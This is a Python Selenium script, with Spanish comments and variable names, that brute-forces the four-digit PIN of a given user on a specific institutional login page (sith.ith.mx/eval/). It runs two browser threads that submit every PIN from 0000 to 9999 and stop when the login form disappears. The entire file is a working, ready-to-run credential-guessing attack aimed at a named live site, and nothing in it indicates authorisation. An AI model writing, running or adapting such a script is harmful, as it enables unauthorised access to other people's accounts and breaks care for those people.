from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
import os
import threading
from dotenv import load_dotenv

load_dotenv()

URL_LOGIN = "http://sith.ith.mx/eval/"
USUARIO = os.getenv('USUARIO')
NUM_NAVEGADORES = 2
HEADLESS_MODE = False
TIMEOUT = 10

encontrado = False
pin_correcto = None
lock = threading.Lock()

def worker_target(rango_inicio, rango_fin):
    global encontrado, pin_correcto
    options = webdriver.ChromeOptions()
    if HEADLESS_MODE: options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    wait = WebDriverWait(driver, TIMEOUT)
    
    print(f"[Hilo {threading.current_thread().name}] Iniciando rango {rango_inicio:04d}-{rango_fin-1:04d}")

    try:
        for i in range(rango_inicio, rango_fin):
            with lock:
                if encontrado: break

            pin_actual = f"{i:04d}"
            
            print(f"[Hilo {threading.current_thread().name}] Probando PIN: {pin_actual}") 
            
            try:
                driver.get(URL_LOGIN)
                
                user_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@placeholder='control']")))
                pass_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@placeholder='nip']")))
                btn_aceptar = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[text()='Aceptar']")))
                
                user_input.send_keys(USUARIO)
                pass_input.send_keys(pin_actual)
                btn_aceptar.click()
                
                try:
                    WebDriverWait(driver, TIMEOUT).until_not(
                        EC.presence_of_element_located((By.XPATH, "//input[@placeholder='nip']"))
                    )
                    
                    with lock:
                        if not encontrado:
                            encontrado = True
                            pin_correcto = pin_actual
                    print(f"\n¡EXITO! PIN ENCONTRADO: {pin_actual}")
                    break
                    
                except TimeoutException:
                    pass 

            except Exception as e:
                print(f"Error técnico en PIN {pin_actual}: {e}")
                continue

    finally:
        driver.quit()

def main():
    if not USUARIO:
        print("Error: Falta la variable USUARIO en el .env")
        return

    print(f"Buscando PIN para usuario: {USUARIO}...")
    
    total = 10000
    chunk = total // NUM_NAVEGADORES
    hilos = []

    for i in range(NUM_NAVEGADORES):
        start = i * chunk
        end = (i + 1) * chunk if i < NUM_NAVEGADORES - 1 else total
        t = threading.Thread(target=worker_target, args=(start, end), name=f"{i+1}")
        hilos.append(t)
        t.start()

    for t in hilos:
        t.join()

    if encontrado:
        print(f"\n--- PIN CORRECTO: {pin_correcto} ---")
    else:
        print("\n--- No se encontró el PIN ---")

if __name__ == "__main__":
    main()